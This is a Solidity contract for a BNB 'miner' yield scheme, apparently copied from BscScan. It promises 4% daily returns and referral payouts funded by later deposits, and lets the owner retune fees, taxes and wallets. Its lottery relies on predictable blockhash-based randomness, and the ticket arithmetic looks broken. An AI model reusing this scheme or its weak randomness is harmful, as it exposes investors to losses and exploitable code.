/**
 *Submitted for verification at BscScan.com on 2022-02-28
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-02-11
*/

/**

BSC Defi - BNB Miner V2 - Community Airdrop Edition

  ~ 4% daily interest contract basis.
  ~ 4% Referral Bonus, rewards wil go straight to the wallet.
  ~ 2.5% stacking compound bonus every 12 hours, max of 7 days.
  ~ 36 hours cut off time.
  ~ 12 hours withdraw cooldown.
  ~ 0.1 bnb minimum investment.
  ~ 20 bnb max deposits per wallet.
  ~ 40% feedback tax on 2 consecutive withdrawals.
    *Tax will stay in the contract.


  3.5% tax will be transferred to the community wallet and be aidropped to the investors who lost their money from V1.
  1.5% tax will be used for dev fee, which will include system maintenance, sharing it with the admins and also for future events.

  NOTE: Changes with in the tax wallets will be considered not until every single one investor from V1 is paid out.

*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Reborn {
    using SafeMath for uint256;

    /** base parameters **/
    uint256 public EGGS_TO_HIRE_1MINERS = 2160000; /** 4% **/
    uint256 public EGGS_TO_HIRE_1MINERS_COMPOUND = 1200000; /** 6% **/
    uint256 public REFERRAL = 40;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public TAX = 35;
    uint256 public DEV = 15;
    uint256 public LOTTERY = 100;
    uint256 public MARKET_EGGS_DIVISOR = 8;
    uint256 public MARKET_EGGS_DIVISOR_SELL = 2;

    bool public LOTTERY_ACTIVATED;
    uint256 public LOTTERY_START_TIME;
    uint256 public LOTTERY_PERCENT = 10;
    uint256 public LOTTERY_STEP = 4 * 60 * 60;
    uint256 public LOTTERY_TICKET_PRICE = 5 * 1e15;
    uint256 public MAX_LOTTERY_TICKET = 50;
    uint256 public MAX_LOTTERY_PARTICIPANTS = 100;
    uint256 public lotteryRound = 0;
    uint256 public currentPot = 0;
    uint256 public participants = 0;
    uint256 public totalTickets = 0;

    /** investment limit parameters **/
    uint256 public MIN_INVEST_LIMIT = 100 * 1e15; /** 0.1 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 20 ether; /** 20 BNB  **/

    /** bonus parameters **/
	uint256 public COMPOUND_BONUS = 25; /** 2.5% **/
	uint256 public COMPOUND_BONUS_MAX_TIMES = 14; /** 14 times / 7 days. **/
    uint256 public COMPOUND_STEP = 12 * 60 * 60; /** every 12 hours. **/

    /** withdrawal tax parameters **/
    uint256 public WITHDRAWAL_TAX = 400;
    uint256 public WITHDRAWAL_TAX_DAYS = 2;

    /* statistics parameters */
    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;
    uint256 public totalLotteryBonus;


    /* miner parameters */
    uint256 public marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool public contractStarted;

    /** cooldown parameters **/
	uint256 public CUTOFF_STEP = 36 * 60 * 60; /** 36 hours  **/
	uint256 public WITHDRAW_COOLDOWN = 12 * 60 * 60; /** 12 hours  **/

    /* addresses */
    address payable public owner;
    address payable public taxWallet;

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 totalLotteryBonus;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 withdrawCount;
        uint256 lastWithdrawTime;
    }

        struct LotteryHistory {
        uint256 round;
        address winnerAddress;
        uint256 pot;
        uint256 totalLotteryParticipants;
        uint256 totalLotteryTickets;
    } 

    LotteryHistory[] internal lotteryHistory;
    mapping(address => User) public users;
    mapping(uint256 => mapping(address => uint256)) public ticketOwners;
    mapping(uint256 => mapping(uint256 => address)) public participantAdresses;
    event LotteryWinner(address indexed investor, uint256 pot, uint256 indexed round);

    constructor(address payable _owner, address payable _taxWallet) {
		require(!isContract(_owner) && !isContract(_taxWallet));
        owner = _owner;
        taxWallet = _taxWallet;
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function initialize() public{
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketEggs == 0);
    			contractStarted = true;
                marketEggs = 216000000000;
                LOTTERY_ACTIVATED = true;
                LOTTERY_START_TIME = block.timestamp;
    		} else revert("Contract not yet started.");
    	}
    }

    function hatchEggs(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");

        uint256 eggsUsed = getMyEggs();
        uint256 eggsForCompound = eggsUsed;
        
        /**  miner increase -- check if for compound, new deposit and compound can have different percentage basis. **/
        uint256 newMiners;

        /** isCompound -- only true when compounding. **/
        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsForCompound);
            eggsForCompound = eggsForCompound.add(dailyCompoundBonus);
            uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
            user.userDeposit = user.userDeposit.add(eggsUsedValue);
            totalCompound = totalCompound.add(eggsUsedValue);
            newMiners = eggsForCompound.div(EGGS_TO_HIRE_1MINERS_COMPOUND);

            if (LOTTERY_ACTIVATED && eggsUsedValue >= LOTTERY_TICKET_PRICE) {
                _buyTickets(msg.sender, eggsUsedValue);
            }
        }else{
            newMiners = eggsForCompound.div(EGGS_TO_HIRE_1MINERS);
        } 

        /** compounding bonus add count if greater than COMPOUND_STEP. **/
        if(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
        }

        /** withdraw Count will only reset if last withdraw time is greater than or equal to COMPOUND_STEP.
            re-use COMPOUND_STEP step time constant to do validation the validation  **/
        if(block.timestamp.sub(user.lastWithdrawTime) >= COMPOUND_STEP){
            user.withdrawCount = 0;
        }
        
        user.miners = user.miners.add(newMiners);
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

    /** lower the increase of marketEggs value for every compound/deposit, this will make the inflation slower.  20%(5) to 8%(12). **/
        marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));
    }

    function sellEggs() public{
        require(contractStarted);
        User storage user = users[msg.sender];
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);

        if(user.lastHatch.add(WITHDRAW_COOLDOWN) > block.timestamp) revert("Withdrawals can only be done after withdraw cooldown.");
        
        /** reset claim. **/
        user.claimedEggs = 0;
        
        /** reset hatch time. **/      
        user.lastHatch = block.timestamp;
        
        /** reset daily compound bonus. **/
        user.dailyCompoundBonus = 0;

        /** add withdraw count. **/
        user.withdrawCount = user.withdrawCount.add(1); 
        
        /** if user withdraw count is >= 2, implement = 40% tax. **/
        if(user.withdrawCount >= WITHDRAWAL_TAX_DAYS){
          eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }
        
        /** set last withdrawal time **/
        user.lastWithdrawTime = block.timestamp;

        /** lowering the amount of eggs that is being added to the total eggs supply to only 5% for each sell **/
        marketEggs = marketEggs.add(hasEggs.div(MARKET_EGGS_DIVISOR_SELL));
        
        /** check if contract has enough funds to pay -- one last ride. **/
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(payFees(eggValue));
        payable(address(msg.sender)).transfer(eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);

        if(block.timestamp.sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants >= MAX_LOTTERY_PARTICIPANTS){
            chooseWinner();
        }
    }

    /** transfer amount of BNB **/
    function buyEggs(address ref) public payable{
        User storage user = users[msg.sender];
        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedEggs = user.claimedEggs.add(eggsBought);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
                
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                /** referral rewards will be in BNB **/
                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
                payable(address(upline)).transfer(refRewards);
                /** referral rewards will be in BNB value **/
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }

        uint256 eggsPayout = payFees(msg.value);
        /** less the fee on total Staked to give more transparency of data. **/
        totalStaked = totalStaked.add(msg.value.sub(eggsPayout));
        totalDeposits = totalDeposits.add(1);

        if (LOTTERY_ACTIVATED) {
			_buyTickets(msg.sender, msg.value);
		} 

        hatchEggs(false);
    }

    function payFees(uint256 eggValue) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
        uint256 dev = eggValue.mul(DEV).div(PERCENTS_DIVIDER);
        taxWallet.transfer(tax);
        owner.transfer(dev);
        return tax.add(dev);
    }

    function _buyTickets(address userAddress, uint256 amount) private {
        require(amount != 0, "zero purchase amount");
        uint256 userTickets = ticketOwners[lotteryRound][userAddress];
        uint256 numTickets = amount.div(LOTTERY_TICKET_PRICE);

        if(userTickets == 0) {
            participantAdresses[lotteryRound][participants] = userAddress;

            if(numTickets > 0){
              participants = participants.add(1);
            }
        }

        if (userTickets.add(numTickets) > MAX_LOTTERY_TICKET) {
            numTickets = MAX_LOTTERY_TICKET.sub(userTickets);
        }

        ticketOwners[lotteryRound][userAddress] = userTickets.add(numTickets);
        currentPot = currentPot.add(amount.mul(LOTTERY_PERCENT).div(PERCENTS_DIVIDER));
        totalTickets = totalTickets.add(numTickets);

        if(block.timestamp.sub(LOTTERY_START_TIME) >= LOTTERY_STEP || participants >= MAX_LOTTERY_PARTICIPANTS){
            chooseWinner();
        }
    }

    function chooseWinner() public {
       require(((block.timestamp.sub(LOTTERY_START_TIME) >= LOTTERY_STEP) || participants >= MAX_LOTTERY_PARTICIPANTS),
        "Lottery must run for LOTTERY_STEP or there must be MAX_LOTTERY_PARTICIPANTS particpants");
        if(participants != 0){
            uint256[] memory init_range = new uint256[](participants);
            uint256[] memory end_range = new uint256[](participants);

            uint256 last_range = 0;

            for(uint256 i = 0; i < participants; i++){
                uint256 range0 = last_range.add(1);
                uint256 range1 = range0.add(ticketOwners[lotteryRound][participantAdresses[lotteryRound][i]].div(1e18));

                init_range[i] = range0;
                end_range[i] = range1;
                last_range = range1;
            }

            uint256 random = _getRandom().mod(last_range).add(1);

            for(uint256 i = 0; i < participants; i++){
                if((random >= init_range[i]) && (random <= end_range[i])){

                    address winnerAddress = participantAdresses[lotteryRound][i];
                    User storage user = users[winnerAddress];

                    uint256 eggs = currentPot.mul(9).div(10);
                    uint256 eggsReward = calculateEggBuy(eggs, address(this).balance.sub(eggs));
                    user.claimedEggs = user.claimedEggs.add(eggsReward);

                    user.totalLotteryBonus = user.totalLotteryBonus.add(eggsReward);
                    totalLotteryBonus = totalLotteryBonus.add(eggsReward);
                    uint256 dev = currentPot.mul(LOTTERY).div(PERCENTS_DIVIDER);
                    owner.transfer(dev);

                    lotteryHistory.push(LotteryHistory(lotteryRound, winnerAddress, eggs, participants, totalTickets));
                    emit LotteryWinner(winnerAddress, eggs, lotteryRound);

                    currentPot = 0;
                    participants = 0;
                    totalTickets = 0;
                    LOTTERY_START_TIME = block.timestamp;
                    lotteryRound = lotteryRound.add(1);
                    break;
                }
            }
        }else{
            LOTTERY_START_TIME = block.timestamp;
        }
       
    }

    function _getRandom() private view returns(uint256){
        bytes32 _blockhash = blockhash(block.number-1);
        return uint256(keccak256(abi.encode(_blockhash,block.timestamp,currentPot,block.difficulty, marketEggs, address(this).balance)));
    } 



    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getLotteryHistory(uint256 index) public view returns(uint256 round, address winnerAddress, uint256 pot,
	  uint256 totalLotteryParticipants, uint256 totalLotteryTickets) {
		round = lotteryHistory[index].round;
		winnerAddress = lotteryHistory[index].winnerAddress;
		pot = lotteryHistory[index].pot;
		totalLotteryParticipants = lotteryHistory[index].totalLotteryParticipants;
		totalLotteryTickets = lotteryHistory[index].totalLotteryTickets;
	}

    function getLotteryInfo() public view returns (uint256 lotteryStartTime,  uint256 lotteryStep, uint256 lotteryCurrentPot,
	  uint256 lotteryParticipants, uint256 maxLotteryParticipants, uint256 totalLotteryTickets, uint256 lotteryTicketPrice, 
      uint256 maxLotteryTicket, uint256 lotteryPercent, uint256 round){
		lotteryStartTime = LOTTERY_START_TIME;
		lotteryStep = LOTTERY_STEP;
		lotteryTicketPrice = LOTTERY_TICKET_PRICE;
		maxLotteryParticipants = MAX_LOTTERY_PARTICIPANTS;
		round = lotteryRound;
		lotteryCurrentPot = currentPot;
		lotteryParticipants = participants;
	    totalLotteryTickets = totalTickets;
        maxLotteryTicket = MAX_LOTTERY_TICKET;
        lotteryPercent = LOTTERY_PERCENT;
	}


    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _totalLotteryBonus, uint256 _lastHatch, address _referrer, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _lastWithdrawTime, uint256 _withdrawCount) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedEggs = users[_adr].claimedEggs;
         _totalLotteryBonus = users[_adr].totalLotteryBonus;
         _lastHatch = users[_adr].lastHatch;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralEggRewards = users[_adr].referralEggRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
         _withdrawCount = users[_adr].withdrawCount;
	}

    function getUserTickets(address _userAddress) public view returns(uint256) {
         return ticketOwners[lotteryRound][_userAddress];
    }

    function getLotteryTimer() public view returns(uint256) {
        return LOTTERY_START_TIME.add(LOTTERY_STEP);
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(PSN, bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs), SafeMath.mul(PSNH, rt)), rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

    /** How many miners and eggs per day user will recieve based on BNB deposit **/
    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus, uint256 _totalLotteryBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus, totalLotteryBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function ENABLE_LOTTERY() public {
        require(msg.sender == owner, "Admin use only.");
        require(contractStarted);
        LOTTERY_ACTIVATED = true;
        LOTTERY_START_TIME = block.timestamp;
    } 

    function DISABLE_LOTTERY() public {
        require(msg.sender == owner, "Admin use only.");
        require(contractStarted);
        LOTTERY_ACTIVATED = false;
    }

    /** wallet addresses setters **/
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = payable(value);
    }

    function CHANGE_FEE_WALLET(address value) external {
        require(msg.sender == owner, "Admin use only.");
        taxWallet = payable(value);
    }

    /** percentage setters **/

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%, 1080000 - 8%
    // 959000 - 9%, 864000 - 10%, 720000 - 12%, 575424 - 15%, 540000 - 16%, 479520 - 18%
    
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
        EGGS_TO_HIRE_1MINERS = value;
    }

    function PRC_EGGS_TO_HIRE_1MINERS_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 479520 && value <= 2592000); /** min 3% max 12%**/
        EGGS_TO_HIRE_1MINERS_COMPOUND = value;
    }

    function PRC_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 50); /** 5% max **/
        TAX = value;
    }

    function PRC_DEV(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50); /** 5% max **/
        DEV = value;
    }

    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 70); /** 70% max **/
        REFERRAL = value;
    }

    function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50); /** 50 = 2% as lowest **/
        MARKET_EGGS_DIVISOR = value;
    }

    function PRC_MARKET_EGGS_DIVISOR_SELL(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 50); /** 50 = 2% as lowest **/
        MARKET_EGGS_DIVISOR_SELL = value;
    }

    function PRC_LOTTERY(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 100);
        LOTTERY = value;
    } 

    function SET_LOTTERY_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        LOTTERY_STEP = value * 60 * 60;
    } 

    function SET_LOTTERY_PERCENT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 10 && value <= 50);
        LOTTERY_PERCENT = value;
    }

    function SET_LOTTERY_TICKET_PRICE(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        LOTTERY_TICKET_PRICE = value * 1e15;
    }

    function SET_MAX_LOTTERY_TICKET(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 1 && value <= 100);
        MAX_LOTTERY_TICKET = value;
    }

    function SET_MAX_LOTTERY_PARTICIPANTS(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 2 && value <= 200);
        MAX_LOTTERY_PARTICIPANTS = value;
    }


    /** withdrawal tax setters **/
    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 500); /** Max Tax is 50% or lower **/
        WITHDRAWAL_TAX = value;
    }

    function SET_WITHDRAW_DAYS_TAX(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 2); /** Minimum 3 days **/
        WITHDRAWAL_TAX_DAYS = value;
    }

    /** bonus setters **/
    function BONUS_DAILY_COMPOUND(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 10 && value <= 900); /** 90% max **/
        COMPOUND_BONUS = value;
    }

    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value <= 30); /** 30 max **/
        COMPOUND_BONUS_MAX_TIMES = value;
    }

    function BONUS_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
         /** hour conversion **/
        COMPOUND_STEP = value * 60 * 60;
    }

    function SET_INVEST_MIN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        MIN_INVEST_LIMIT = value * 1e15;
    }

    /** time setters **/
    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        CUTOFF_STEP = value * 60 * 60;
    }

    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value <= 24);
        WITHDRAW_COOLDOWN = value * 60 * 60;
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 10);
        WALLET_DEPOSIT_LIMIT = value * 1 ether;
    }
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}